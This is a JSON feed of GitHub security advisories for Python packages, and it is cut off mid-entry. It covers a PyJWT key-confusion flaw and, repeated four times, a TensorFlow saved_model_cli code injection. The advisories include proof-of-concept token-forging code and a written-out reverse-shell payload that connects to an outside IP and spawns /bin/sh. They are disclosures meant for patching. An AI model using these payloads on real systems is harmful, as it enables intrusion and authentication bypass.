{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Disclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).</p>\n<blockquote>\n<p>PyJWT supports multiple different JWT signing algorithms. With JWT, an \nattacker submitting the JWT token can choose the used signing algorithm.</p>\n<p>The PyJWT library requires that the application chooses what algorithms \nare supported. The application can specify \n\"jwt.algorithms.get_default_algorithms()\" to get support for all \nalgorithms. They can also specify a single one of them (which is the \nusual use case if calling jwt.decode directly. However, if calling \njwt.decode in a helper function, all algorithms might be enabled.)</p>\n<p>For example, if the user chooses \"none\" algorithm and the JWT checker \nsupports that, there will be no signature checking. This is a common \nsecurity issue with some JWT implementations.</p>\n<p>PyJWT combats this by requiring that the if the \"none\" algorithm is \nused, the key has to be empty. As the key is given by the application \nrunning the checker, attacker cannot force \"none\" cipher to be used.</p>\n<p>Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is \nnot a public key meant for asymmetric algorithm i.e. HMAC cannot be used \nif the key begins with \"ssh-rsa\". If HMAC is used with a public key, the \nattacker can just use the publicly known public key to sign the token \nand the checker would use the same key to verify.</p>\n<p> From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. \nWith ed25519, PyJWT supports public keys that start with \"ssh-\", for \nexample \"ssh-ed25519\".</p>\n</blockquote>\n<pre><code class=\"language-python\">import jwt\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import ed25519\n\n# Generate ed25519 private key\nprivate_key = ed25519.Ed25519PrivateKey.generate()\n\n# Get private key bytes as they would be stored in a file\npriv_key_bytes = \nprivate_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, \nencryption_algorithm=serialization.NoEncryption())\n\n# Get public key bytes as they would be stored in a file\npub_key_bytes = \nprivate_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)\n\n# Making a good jwt token that should work by signing it with the \nprivate key\nencoded_good = jwt.encode({\"test\": 1234}, priv_key_bytes, algorithm=\"EdDSA\")\n\n# Using HMAC with the public key to trick the receiver to think that the \npublic key is a HMAC secret\nencoded_bad = jwt.encode({\"test\": 1234}, pub_key_bytes, algorithm=\"HS256\")\n\n# Both of the jwt tokens are validated as valid\ndecoded_good = jwt.decode(encoded_good, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\ndecoded_bad = jwt.decode(encoded_bad, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\n\nif decoded_good == decoded_bad:\n &nbsp;&nbsp;&nbsp; print(\"POC Successfull\")\n\n# Of course the receiver should specify ed25519 algorithm to be used if \nthey specify ed25519 public key. However, if other algorithms are used, \nthe POC does not work\n# HMAC specifies illegal strings for the HMAC secret in jwt/algorithms.py\n#\n#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; invalid_strings = [\n#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b\"-----BEGIN PUBLIC KEY-----\",\n#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b\"-----BEGIN CERTIFICATE-----\",\n#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b\"-----BEGIN RSA PUBLIC KEY-----\",\n#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b\"ssh-rsa\",\n#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ]\n#\n# However, OKPAlgorithm (ed25519) accepts the following in \njwt/algorithms.py:\n#\n#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if \"-----BEGIN PUBLIC\" in str_key:\n#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return load_pem_public_key(key)\n#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if \"-----BEGIN PRIVATE\" in str_key:\n#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return load_pem_private_key(key, password=None)\n#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if str_key[0:4] == \"ssh-\":\n#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return load_ssh_public_key(key)\n#\n# These should most likely made to match each other to prevent this behavior\n</code></pre>\n<pre><code class=\"language-python\">import jwt\n\n#openssl ecparam -genkey -name prime256v1 -noout -out ec256-key-priv.pem\n#openssl ec -in ec256-key-priv.pem -pubout &gt; ec256-key-pub.pem\n#ssh-keygen -y -f ec256-key-priv.pem &gt; ec256-key-ssh.pub\n\npriv_key_bytes = b\"\"\"-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIOWc7RbaNswMtNtc+n6WZDlUblMr2FBPo79fcGXsJlGQoAoGCCqGSM49\nAwEHoUQDQgAElcy2RSSSgn2RA/xCGko79N+7FwoLZr3Z0ij/ENjow2XpUDwwKEKk\nAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\n-----END EC PRIVATE KEY-----\"\"\"\n\npub_key_bytes = b\"\"\"-----BEGIN PUBLIC KEY-----\nMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAElcy2RSSSgn2RA/xCGko79N+7FwoL\nZr3Z0ij/ENjow2XpUDwwKEKkAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\n-----END PUBLIC KEY-----\"\"\"\n\nssh_key_bytes = b\"\"\"ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXMtkUkkoJ9kQP8QhpKO/TfuxcKC2a92dIo/xDY6MNl6VA8MChCpAJN0w1wvVPJ4qTJRnGO7A6V6dl8oRxDPkc=\"\"\"\n\n# Making a good jwt token that should work by signing it with the private key\nencoded_good = jwt.encode({\"test\": 1234}, priv_key_bytes, algorithm=\"ES256\")\n\n# Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret\nencoded_bad = jwt.encode({\"test\": 1234}, ssh_key_bytes, algorithm=\"HS256\")\n\n# Both of the jwt tokens are validated as valid\ndecoded_good = jwt.decode(encoded_good, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\ndecoded_bad = jwt.decode(encoded_bad, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\n\nif decoded_good == decoded_bad:\n    print(\"POC Successfull\")\nelse:\n    print(\"POC Failed\")\n</code></pre>\n<blockquote>\n<p>The issue is not that big as \nalgorithms=jwt.algorithms.get_default_algorithms() has to be used. \nHowever, with quick googling, this seems to be used in some cases at \nleast in some minor projects.</p>\n</blockquote>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to v2.4.0.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Always be explicit with the algorithms that are accepted and expected when decoding.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/jpadilla/pyjwt\">https://github.com/jpadilla/pyjwt</a></li>\n<li>Email Jos√© Padilla: pyjwt at jpadilla dot com</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24\">https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29217\">https://nvd.nist.gov/vuln/detail/CVE-2022-29217</a></li>\n<li><a href=\"https://github.com/jpadilla/pyjwt/commit/9c528670c455b8d948aff95ed50e22940d1ad3fc\">https://github.com/jpadilla/pyjwt/commit/9c528670c455b8d948aff95ed50e22940d1ad3fc</a></li>\n<li><a href=\"https://github.com/jpadilla/pyjwt/releases/tag/2.4.0\">https://github.com/jpadilla/pyjwt/releases/tag/2.4.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ffqj-6fqr-9h24\">https://github.com/advisories/GHSA-ffqj-6fqr-9h24</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ffqj-6fqr-9h24",
            "title": "[pyjwt] Key confusion through non-blocklisted public key formats",
            "date_modified": "2022-05-24T22:17:36.000Z",
            "date_published": "2022-05-24T22:17:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ffqj-6fqr-9h24"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>\n<pre><code>saved_model_cli run --input_exprs 'x=print(\"malicious code to run\")' --dir ./\n--tag_set serve --signature_def serving_default\n</code></pre>\n<p>This can be used to open a reverse shell                                      </p>\n<pre><code>saved_model_cli run --input_exprs 'hello=exec(\"\"\"\\nimport socket\\nimport\nsubprocess\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\"10.0.2.143\",33419))\\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")'\n--dir ./ --tag_set serve --signature_def serving_default\n</code></pre>\n<p>This is because <a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">the fix</a> for <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41228\">CVE-2021-41228</a> was incomplete. Under <a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">certain code paths</a> it still allows unsafe execution:</p>\n<pre><code class=\"language-python\">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n</code></pre>\n<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>\n<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29216\">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc",
            "title": "[tensorflow-gpu] Code injection in `saved_model_cli`",
            "date_modified": "2022-05-24T22:16:52.000Z",
            "date_published": "2022-05-24T22:16:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>\n<pre><code>saved_model_cli run --input_exprs 'x=print(\"malicious code to run\")' --dir ./\n--tag_set serve --signature_def serving_default\n</code></pre>\n<p>This can be used to open a reverse shell                                      </p>\n<pre><code>saved_model_cli run --input_exprs 'hello=exec(\"\"\"\\nimport socket\\nimport\nsubprocess\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\"10.0.2.143\",33419))\\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")'\n--dir ./ --tag_set serve --signature_def serving_default\n</code></pre>\n<p>This is because <a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">the fix</a> for <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41228\">CVE-2021-41228</a> was incomplete. Under <a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">certain code paths</a> it still allows unsafe execution:</p>\n<pre><code class=\"language-python\">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n</code></pre>\n<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>\n<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29216\">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc",
            "title": "[tensorflow-gpu] Code injection in `saved_model_cli`",
            "date_modified": "2022-05-24T22:16:52.000Z",
            "date_published": "2022-05-24T22:16:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>\n<pre><code>saved_model_cli run --input_exprs 'x=print(\"malicious code to run\")' --dir ./\n--tag_set serve --signature_def serving_default\n</code></pre>\n<p>This can be used to open a reverse shell                                      </p>\n<pre><code>saved_model_cli run --input_exprs 'hello=exec(\"\"\"\\nimport socket\\nimport\nsubprocess\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\"10.0.2.143\",33419))\\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")'\n--dir ./ --tag_set serve --signature_def serving_default\n</code></pre>\n<p>This is because <a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">the fix</a> for <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41228\">CVE-2021-41228</a> was incomplete. Under <a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">certain code paths</a> it still allows unsafe execution:</p>\n<pre><code class=\"language-python\">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n</code></pre>\n<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>\n<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29216\">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc",
            "title": "[tensorflow-cpu] Code injection in `saved_model_cli`",
            "date_modified": "2022-05-24T22:16:52.000Z",
            "date_published": "2022-05-24T22:16:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>\n<pre><code>saved_model_cli run --input_exprs 'x=print(\"malicious code to run\")' --dir ./\n--tag_set serve --signature_def serving_default\n</code></pre>\n<p>This can be used to open a reverse shell                                      </p>\n<pre><code>saved_model_cli run --input_exprs 'hello=exec(\"\"\"\\nimport socket\\nimport\nsubprocess\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((\"10.0.2.143\",33419))\\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")'\n--dir ./ --tag_set serve --signature_def serving_default\n</code></pre>\n<p>This is because <a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">the fix</a> for <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41228\">CVE-2021-41228</a> was incomplete. Under <a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">certain code paths</a> it still allows unsafe execution:</p>\n<pre><code class=\"language-python\">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n</code></pre>\n<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>\n<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>\n<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-29216\">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7\">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac\">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574\">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4\">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2\">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1\">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0\">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75c9-jrh4-79mc\">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc",
            "title": "[tensorflow-cpu] Code injection in `saved_model_cli`",
            "date_modified": "2022-05-24T22:16:52.000Z",
            "date_published": "2022-05-24T22:16:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75c9-jrh4-79mc"
            }
        },
        {
